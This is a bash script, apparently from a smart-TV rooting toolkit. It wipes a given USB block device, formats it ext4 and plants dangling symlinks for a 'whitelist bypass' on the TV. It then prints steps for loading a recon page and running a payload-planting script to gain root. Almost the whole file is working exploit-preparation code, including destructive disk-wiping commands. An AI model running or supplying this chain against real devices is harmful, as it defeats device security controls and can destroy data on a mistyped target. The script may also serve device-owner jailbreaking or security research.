#!/usr/bin/env bash
# Prepares the ext4 USB stick for the dangling-symlink whitelist bypass.
# DESTRUCTIVE: wipes the given block device.
#
# Usage: sudo ./prepare_usb.sh /dev/sdX
# The TV mounts partitions, not whole-disk superfloppies -> MBR + ext4.
set -euo pipefail

DEV="${1:-}"
if [ -z "$DEV" ] || [ ! -b "$DEV" ]; then
  echo "usage: $0 /dev/sdX   (block device, e.g. /dev/sdb)"
  exit 1
fi

case "$DEV" in
  *mmcblk*|*nvme*) PART="${DEV}p1" ;;
  *)               PART="${DEV}1"  ;;
esac

echo "!!! This will DESTROY $DEV and create MBR + ext4 on $PART."
lsblk -o NAME,SIZE,MODEL,LABEL "$DEV" || true
read -r -p "Type YES to continue: " confirm
[ "$confirm" = "YES" ] || { echo "aborted"; exit 1; }

sudo wipefs -a "$DEV"
sudo parted -s "$DEV" mklabel msdos mkpart primary ext4 1MiB 100%
sudo mkfs.ext4 -F -O ^64bit,^metadata_csum -L TVSYM "$PART"

sudo mkdir -p /mnt/tvsym
sudo mount "$PART" /mnt/tvsym
sudo ln -sfn /3rd_rw/loglevel/lib/libtvsysinfo.so /mnt/tvsym/tvi
sudo ln -sfn /3rd_rw/root_proof.txt                /mnt/tvsym/pwn
ls -l /mnt/tvsym
sudo sync
sudo umount /mnt/tvsym

cat <<EOF

Done: $PART (label TVSYM), symlinks:
  tvi -> /3rd_rw/loglevel/lib/libtvsysinfo.so   (required; must stay dangling)
  pwn -> /3rd_rw/root_proof.txt                  (optional proof target)

Next:
  1. Insert the stick into the TV.
  2. On the TV open http://<host-ip>:9000/recon.html
  3. In the page console run tools/he40/root/scripts/host/plant_payload.js
     (adjust the USB device, e.g. sda1, from listDir("/mnt/usb")).
  4. Reboot the TV.
EOF
